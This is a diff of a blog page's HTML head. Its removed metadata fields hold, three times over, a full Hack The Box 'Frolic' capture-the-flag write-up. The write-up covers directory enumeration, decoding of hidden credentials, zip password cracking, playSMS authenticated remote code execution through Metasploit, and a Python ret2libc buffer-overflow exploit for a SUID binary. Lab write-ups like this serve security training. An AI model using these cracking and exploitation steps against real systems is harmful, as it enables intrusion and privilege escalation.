@@ -3,24 +3,25 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>Hack The Box - Frolic | 0xRick Owned Root !</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<title>Hack The Box - Frolic | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
 <meta property="og:title" content="Hack The Box - Frolic" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Quick Summary Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is 10.10.10.111 , I added it to /etc/hosts as frolic.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sc frolic.htb We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first. HTTP Initial Enumeration By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 12:53:58 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) ===================================================== We got /admin , /backup , /dev and /test. /backup : /dev : We got 403 on /dev , let’s run gobuster again on /dev : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/dev/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 17:51:41 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /backup (Status: 301) /test (Status: 200) ===================================================== We got /backup and /test /dev/backup : /playsms , Let’s check that : It asks for authentication , we will get back to it later when we find any credentials. So that was for /dev. /test : It’s just the phpinfo() page /admin : on /admin there’s an authentication form , and the title is “c’mon i m hackable” :D Hacking the “Hackable” form Let’s take a look at the source code : We notice a script called login.js , maybe authentication is handled by that script. login.js : var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;&amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } We got the username and the password : admin:superduperlooperpassword_lol And after we login we find … this : ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. Ook! After searching on google for a long time I found out that this is an esoteric language called Ook!. Read about esoteric languages here Read about Ook! here I used an online interpreter for Ook! on a website called dcode.fr Output : Nothing here check /asdiSIAJJ0QWE9JAS Playsms password /asdiSIAJJ0QWE9JAS : UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA Obviously it’s base64 , so I copied it and saved it in a txt file to decode it : We got a weird output , let’s redirect the output into a file and check what kind of files is that : It’s a zip archive , let’s unzip it : Password protected. There’s a tool called fcrackzip we can use it to bruteforce the password : fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt The password is “password” ! After extraction we get a file called index.php : 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a Hex encoded , let’s decode it. I will use a website called CyberChef : Base64 encoded output , let’s decode one more time : Another esoteric language. But this time it’s a famous one , brainfuck. We will use dcode.fr again : Output : idkwhatispass Let’s try to login to playsms as admin with this password : And it worked. Exploiting Authenticated RCE and getting user There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a metasploit module for it. The exploit worked and we have a meterpreter session now : We owned user ! Buffer Overflow in rop In the home directory of the user ayush there’s a directory called .binary , which has a binary called rop. we can verify that rop is suid by using find: find /home/ayush/.binary/ -perm -4000 Let’s see what is it doing : So it takes our input and just ouputs it , Let’s try giving it a long string : We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them here We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it here First of all , gdb is not installed on the box : So I download a static version of gdb from github , and uploaded it to the box through the meterpreter session. upload gdb Let’s find the length of the buffer : So the buffer overflows after 52 chars. Now we need to know the address of /bin/sh , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of /bin/sh in libc , we will use strings to get the address : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Offset : 0x0015ba0b Then we need the address of libc , we can use ldd to get it : ldd rop Address : 0xb7e19000 Then we will add the two addresses to get the address of /bin/sh Address of /bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0b Now we need the addresses of system() and exit() : Address of system() : 0xb7e53da0 Address of exit() : 0xb7e479d0 Our final exploit will be: #!/usr/bin/python import struct buf = &quot;A&quot; * 52 system = struct.pack(&quot;I&quot; ,0xb7e53da0) exit = struct.pack(&quot;I&quot; ,0xb7e479d0) shell = struct.pack(&quot;I&quot; ,0xb7f74a0b) print buf + system + exit + shell Let’s upload and run it : ./rop `python /tmp/exploit.py` And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Carrier Next Hack The Box write-up : Hack The Box - Curling" />
-<meta property="og:description" content="Quick Summary Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is 10.10.10.111 , I added it to /etc/hosts as frolic.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sc frolic.htb We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first. HTTP Initial Enumeration By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 12:53:58 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) ===================================================== We got /admin , /backup , /dev and /test. /backup : /dev : We got 403 on /dev , let’s run gobuster again on /dev : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/dev/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 17:51:41 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /backup (Status: 301) /test (Status: 200) ===================================================== We got /backup and /test /dev/backup : /playsms , Let’s check that : It asks for authentication , we will get back to it later when we find any credentials. So that was for /dev. /test : It’s just the phpinfo() page /admin : on /admin there’s an authentication form , and the title is “c’mon i m hackable” :D Hacking the “Hackable” form Let’s take a look at the source code : We notice a script called login.js , maybe authentication is handled by that script. login.js : var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;&amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } We got the username and the password : admin:superduperlooperpassword_lol And after we login we find … this : ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. Ook! After searching on google for a long time I found out that this is an esoteric language called Ook!. Read about esoteric languages here Read about Ook! here I used an online interpreter for Ook! on a website called dcode.fr Output : Nothing here check /asdiSIAJJ0QWE9JAS Playsms password /asdiSIAJJ0QWE9JAS : UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA Obviously it’s base64 , so I copied it and saved it in a txt file to decode it : We got a weird output , let’s redirect the output into a file and check what kind of files is that : It’s a zip archive , let’s unzip it : Password protected. There’s a tool called fcrackzip we can use it to bruteforce the password : fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt The password is “password” ! After extraction we get a file called index.php : 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a Hex encoded , let’s decode it. I will use a website called CyberChef : Base64 encoded output , let’s decode one more time : Another esoteric language. But this time it’s a famous one , brainfuck. We will use dcode.fr again : Output : idkwhatispass Let’s try to login to playsms as admin with this password : And it worked. Exploiting Authenticated RCE and getting user There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a metasploit module for it. The exploit worked and we have a meterpreter session now : We owned user ! Buffer Overflow in rop In the home directory of the user ayush there’s a directory called .binary , which has a binary called rop. we can verify that rop is suid by using find: find /home/ayush/.binary/ -perm -4000 Let’s see what is it doing : So it takes our input and just ouputs it , Let’s try giving it a long string : We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them here We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it here First of all , gdb is not installed on the box : So I download a static version of gdb from github , and uploaded it to the box through the meterpreter session. upload gdb Let’s find the length of the buffer : So the buffer overflows after 52 chars. Now we need to know the address of /bin/sh , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of /bin/sh in libc , we will use strings to get the address : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Offset : 0x0015ba0b Then we need the address of libc , we can use ldd to get it : ldd rop Address : 0xb7e19000 Then we will add the two addresses to get the address of /bin/sh Address of /bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0b Now we need the addresses of system() and exit() : Address of system() : 0xb7e53da0 Address of exit() : 0xb7e479d0 Our final exploit will be: #!/usr/bin/python import struct buf = &quot;A&quot; * 52 system = struct.pack(&quot;I&quot; ,0xb7e53da0) exit = struct.pack(&quot;I&quot; ,0xb7e479d0) shell = struct.pack(&quot;I&quot; ,0xb7f74a0b) print buf + system + exit + shell Let’s upload and run it : ./rop `python /tmp/exploit.py` And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Carrier Next Hack The Box write-up : Hack The Box - Curling" />
+<meta name="description" content="My write-up for Frolic from Hack The Box." />
+<meta property="og:description" content="My write-up for Frolic from Hack The Box." />
 <link rel="canonical" href="http://localhost:4000/hack-the-box/frolic/" />
 <meta property="og:url" content="http://localhost:4000/hack-the-box/frolic/" />
-<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:site_name" content="0xRick" />
 <meta property="og:image" content="http://localhost:4000/hackthebox/frolic/0.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-03-23T00:00:00+02:00" />
 <script type="application/ld+json">
-{"description":"Quick Summary Hey guys today frolic retired and here is my write-up about it. This box was more of a CTF challenge than a real world scenario , especially the user part , But it was nice because for root we will exploit a buffer overflow vulnerability. It’s a linux box and its ip is 10.10.10.111 , I added it to /etc/hosts as frolic.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sc frolic.htb We got ssh on port 22 , smb on port 139 and 445 (which is not a usual thing to see on a linux box) and http on port 9999. We will take a look at http first. HTTP Initial Enumeration By visiting port 9999 we get the welcome page of nginx , so we will use gobuster to enumerate sub directories : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 12:53:58 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin (Status: 301) /backup (Status: 301) /dev (Status: 301) /test (Status: 301) ===================================================== We got /admin , /backup , /dev and /test. /backup : /dev : We got 403 on /dev , let’s run gobuster again on /dev : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://frolic.htb:9999/dev/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/03/22 17:51:41 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /backup (Status: 301) /test (Status: 200) ===================================================== We got /backup and /test /dev/backup : /playsms , Let’s check that : It asks for authentication , we will get back to it later when we find any credentials. So that was for /dev. /test : It’s just the phpinfo() page /admin : on /admin there’s an authentication form , and the title is “c’mon i m hackable” :D Hacking the “Hackable” form Let’s take a look at the source code : We notice a script called login.js , maybe authentication is handled by that script. login.js : var attempt = 3; // Variable to count number of attempts. // Below function Executes on click of login button. function validate(){ var username = document.getElementById(&quot;username&quot;).value; var password = document.getElementById(&quot;password&quot;).value; if ( username == &quot;admin&quot; &amp;&amp; password == &quot;superduperlooperpassword_lol&quot;){ alert (&quot;Login successfully&quot;); window.location = &quot;success.html&quot;; // Redirecting to other page. return false; } else{ attempt --;// Decrementing by one. alert(&quot;You have left &quot;+attempt+&quot; attempt;&quot;); // Disabling fields after 3 attempts. if( attempt == 0){ document.getElementById(&quot;username&quot;).disabled = true; document.getElementById(&quot;password&quot;).disabled = true; document.getElementById(&quot;submit&quot;).disabled = true; return false; } } } We got the username and the password : admin:superduperlooperpassword_lol And after we login we find … this : ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... ..... ..... ..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?.. ..... ..... ....! ..... ..... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !...! ..... ..... .!.!! !!!!! !!!!! !!!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !!!!! .?... ..... ..... ....! ?!!.? ..... ..... ..... .?.?! .?... ..... ..... ...!. !!!!! !!.?. ..... .!?!! .?... ...?. ?!.?. ..... ..!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!!!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.?. ..... ..... ..... .!?!! .?... ..... ..... ...?. ?!.?. ..... !.... ..... ..!.! !!!!! !.!!! !!... ..... ..... ....! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!!! !!!!! !!!!! .?... ....! ?!!.? ..... .?.?! .?... ..... ....! .?... ..... ..... ..!?! !.?.. ..... ..... ..?.? !.?.. !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... .!?!! .?!!! !!!?. ?!.?! !!!!! !!!!! !!... ..... ...!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!.! !!!!! !!!!! !!!!! !.... ..... ..... ..... !.!.? ..... ..... .!?!! .?!!! !!!!! !!?.? !.?!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?.... ..... ..... ..!.. ..... ..... .!.?. ..... ...!? !!.?! !!!!! !!?.? !.?!! !!!.? ..... ..!?! !.?!! !!!!? .?!.? !!!!! !!.?. ..... ...!? !!.?. ..... ..?.? !.?.. !.!!! !!!!! !!!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?! .?... .!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! !!.!! !!!!! ..... ..!.! !!!!! !.?. Ook! After searching on google for a long time I found out that this is an esoteric language called Ook!. Read about esoteric languages here Read about Ook! here I used an online interpreter for Ook! on a website called dcode.fr Output : Nothing here check /asdiSIAJJ0QWE9JAS Playsms password /asdiSIAJJ0QWE9JAS : UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbsK1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmveEMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTjlurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkCAAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBPAAAAAwEAAAAA Obviously it’s base64 , so I copied it and saved it in a txt file to decode it : We got a weird output , let’s redirect the output into a file and check what kind of files is that : It’s a zip archive , let’s unzip it : Password protected. There’s a tool called fcrackzip we can use it to bruteforce the password : fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt The password is “password” ! After extraction we get a file called index.php : 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a Hex encoded , let’s decode it. I will use a website called CyberChef : Base64 encoded output , let’s decode one more time : Another esoteric language. But this time it’s a famous one , brainfuck. We will use dcode.fr again : Output : idkwhatispass Let’s try to login to playsms as admin with this password : And it worked. Exploiting Authenticated RCE and getting user There are some known vulnerabilities for playsms , one of them is an Authenticated CSV File Upload Code Execution (CVE-2017-9101). There’s also a metasploit module for it. The exploit worked and we have a meterpreter session now : We owned user ! Buffer Overflow in rop In the home directory of the user ayush there’s a directory called .binary , which has a binary called rop. we can verify that rop is suid by using find: find /home/ayush/.binary/ -perm -4000 Let’s see what is it doing : So it takes our input and just ouputs it , Let’s try giving it a long string : We got a segmentation fault , so we have a buffer overflow. I will go through the exploitation without explaining everything because I have already written some posts about buffer overflow. You can check them here We are going to do a ret2libc attack , if you are unfamiliar with it , you can read my post about it here First of all , gdb is not installed on the box : So I download a static version of gdb from github , and uploaded it to the box through the meterpreter session. upload gdb Let’s find the length of the buffer : So the buffer overflows after 52 chars. Now we need to know the address of /bin/sh , I won’t do it like I did before by loading the string in a environment variable. There’s a better way to do it , first thing we need to find the offset of /bin/sh in libc , we will use strings to get the address : strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh Offset : 0x0015ba0b Then we need the address of libc , we can use ldd to get it : ldd rop Address : 0xb7e19000 Then we will add the two addresses to get the address of /bin/sh Address of /bin/sh : 0x0015ba0b + 0xb7e19000 = 0xb7f74a0b Now we need the addresses of system() and exit() : Address of system() : 0xb7e53da0 Address of exit() : 0xb7e479d0 Our final exploit will be: #!/usr/bin/python import struct buf = &quot;A&quot; * 52 system = struct.pack(&quot;I&quot; ,0xb7e53da0) exit = struct.pack(&quot;I&quot; ,0xb7e479d0) shell = struct.pack(&quot;I&quot; ,0xb7f74a0b) print buf + system + exit + shell Let’s upload and run it : ./rop `python /tmp/exploit.py` And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Carrier Next Hack The Box write-up : Hack The Box - Curling","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/frolic/","image":"http://localhost:4000/hackthebox/frolic/0.png","headline":"Hack The Box - Frolic","dateModified":"2019-03-23T00:00:00+02:00","datePublished":"2019-03-23T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/frolic/"},"@context":"http://schema.org"}</script>
+{"description":"My write-up for Frolic from Hack The Box.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/frolic/","image":"http://localhost:4000/hackthebox/frolic/0.png","headline":"Hack The Box - Frolic","dateModified":"2019-03-23T00:00:00+02:00","datePublished":"2019-03-23T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/frolic/"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/tagbuttons.css">
-  <link rel="stylesheet" href="/assets/css/ad.css">
-  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
